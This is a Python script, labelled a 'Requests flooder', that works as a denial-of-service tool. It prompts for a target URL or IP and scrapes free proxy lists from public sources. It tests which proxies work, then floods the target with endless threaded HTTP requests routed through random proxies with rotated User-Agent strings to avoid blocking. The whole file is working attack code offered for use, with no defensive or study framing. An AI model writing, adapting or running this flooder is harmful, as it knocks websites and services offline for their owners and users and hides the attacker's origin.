# © Requests flooder- Made by Yuval Simon. For www.bogan.cool

import random, sys, os, time

import requests
import threading

from colorama import Fore

from os import system, name

# Main
target = input(f'{Fore.BLUE}[CONSOLE] Please enter the target (link/ip): ')
thr = int(input(f"{Fore.BLUE}[CONSOLE] Please enter threads number: "))
proxy_type = input(f"{Fore.BLUE}[CONSOLE] Please enter proxy type (http/socks4/socks5): ")
get_proxy = input(f"{Fore.BLUE}[CONSOLE] Do you want me to get the proxies for you? (y/n): ")

if get_proxy == "y":

    proxylist = open('proxylist1.txt', 'a+')
    try:
        r1 = requests.get(f'https://api.proxyscrape.com?request=getproxies&proxytype={proxy_type}')
        proxylist.write(r1.text)
    except:
        pass
    try:
        r3 = requests.get(f"https://www.proxyscan.io/download?type={proxy_type}")
        proxylist.write(r3.text)
    except:
        pass
    try:
        r4 = requests.get(f"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/{proxy_type}.txt")
        proxylist.write(r4.text)
    except:
        pass
    proxylist.close()

    try:
        lines_seen = set()
        outfile = open('proxylist.txt', "a+")
        for line in open(f'proxylist1.txt', "r"):
            if line not in lines_seen:
                outfile.write(line)
                lines_seen.add(line)
        outfile.close()
        proxy_file = 'proxylist'
        
        time.sleep(0.1)
        os.remove('proxylist1.txt')

    except FileNotFoundError:
        print(f'{Fore.RED}[CONSOLE] I did not find any proxies!')

    except:
        pass
elif get_proxy == "n":
    proxy_file = input(f'{Fore.BLUE}[CONSOLE] Please enter proxy filename without .txt extention: ')

check_proxy = input(f"{Fore.BLUE}[CONSOLE] Do you want me to check the proxies too? (y/n): ")
timeout = int(input(f"{Fore.BLUE}[CONSOLE] Please enter timeout: "))

p_checked = 0
good = 0
good_p = 0


# Proxy Checker
def proxy_checker(proxy):
    global p_checked, good_p
    headers = {'User-Agent': ''}
    user_agent_list = [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
        'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
        'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000',
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)", 
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", 
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", 
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)", 
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", 
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5", 
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6", 
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11", 
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20", 
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    ]
    headers['User-Agent'] = random.choice(user_agent_list)

    url = f'{target}'
    F = open('good_proxies.txt', "a+")

    if proxy_type == 'http':
        try:
            req = requests.get(url, headers=headers, proxies={'https': f'https://{proxy}', 'http': f'http://{proxy}'}, timeout=timeout)
            if req.ok:
                good_p += 1
                F.write(proxy)
                F.close()
        
            else:
                pass

        except:
            pass

    else:
        try:
            req = requests.get(url, headers=headers, proxies={'https': f'{proxy_type}://{proxy}', 'http': f'{proxy_type}://{proxy}'}, timeout=timeout)
            if req.ok:
                good_p += 1
                F.write(proxy)
                F.close()
        
            else:
                pass

        except:
            pass

# ddos
def ddos(proxy):
    global good
    headers = {'User-Agent': ''}
    user_agent_list = [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
        'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
        'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000',
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)", 
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", 
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", 
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)", 
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1", 
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", 
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5", 
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6", 
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11", 
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20", 
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    ]
    headers['User-Agent'] = random.choice(user_agent_list)
    s = requests.session()

    if proxy_type == 'http':
        try:
            req = s.get(target, headers=headers, proxies={'https': f'https://{proxy}', 'http': f'http://{proxy}'}, timeout=timeout)
            if req.ok:
                good += 1
        
            else:
                pass
        except:
            pass

    else:
        try:
            req = requests.get(target, headers=headers, proxies={'https': f'{proxy_type}://{proxy}', 'http': f'{proxy_type}://{proxy}'}, timeout=timeout)
            if req.ok:
                good += 1
            else:
                pass

        except:
            pass

# Start proxy checker
def start_proxy_checker():
    global p_checked    
    os.system('clear')
    try:
        with open(f"{proxy_file}.txt", "r") as f:
            threads = []
            lines = f.readlines()
            for p in lines:
                if p_checked < len(lines):
                    p_checked += 1
                    t = threading.Thread(target=proxy_checker, args=(p,))
                    t.start()
                    threads.append(t)
                    time.sleep(0.01)
                    sys.stdout.write(f"{Fore.BLUE}[CONSOLE] Checked {p_checked} proxies\r")
                    sys.stdout.flush()

            os.system('clear')
            for t in threads:
                t.join()
            sys.stdout.write(f"\r\n{Fore.RED}[CONSOLE] Closing threads")
            sys.stdout.flush()
        
    except FileNotFoundError:
        print(f'{Fore.RED}[CONSOLE] Proxy file not found!')


# Start ddos
def start_ddos():
    global good
    try:
        Fe = open('good_proxies.txt', "r")
        read = Fe.readlines()
        while 1:
            if threading.active_count() < int(thr):
                pro = random.choice(read)
                threading.Thread(target=ddos, args=(pro,)).start()
                time.sleep(0.01)
                sys.stdout.write(f"{Fore.GREEN}[CONSOLE] {good} Successful requests have been made.\r")
                sys.stdout.flush()

        os.system('clear')

    except FileNotFoundError:
        print(f'{Fore.RED}[CONSOLE] File not found!')


if __name__ == '__main__':
    if check_proxy == "y":
        start_proxy_checker()

        os.system('clear')

        time.sleep(0.1)
        print(f"\r\n{Fore.YELLOW}[CONSOLE] Checked all proxies, Total Worked: {good_p}")
        time.sleep(1.5)

        os.system('clear')

        start_ddos()

    else:
        os.system('clear')

        start_ddos()
        

